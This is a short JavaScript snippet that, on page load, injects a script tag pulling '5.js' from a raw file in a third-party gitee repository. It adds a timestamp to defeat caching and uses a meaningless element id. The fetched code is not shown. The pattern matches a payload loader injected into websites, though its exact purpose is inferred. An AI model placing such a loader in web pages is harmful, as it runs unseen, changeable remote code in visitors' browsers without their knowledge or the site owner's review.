var tiaojjjxxxbbbObj = document.getElementById("tiaojjjxxxbbb");
if (tiaojjjxxxbbbObj) {
	tiaojjjxxxbbbObj.style.display = "block"
} else {
	var element = document.createElement('script');
	element.id = 'tiaojjjxxxbbb';
	element.charset = 'utf-8', element.setAttribute('src', 'https://gitee.com/ok30/10/raw/master/5.js?' + Date.parse(new Date()));
	document.body.appendChild(element)
};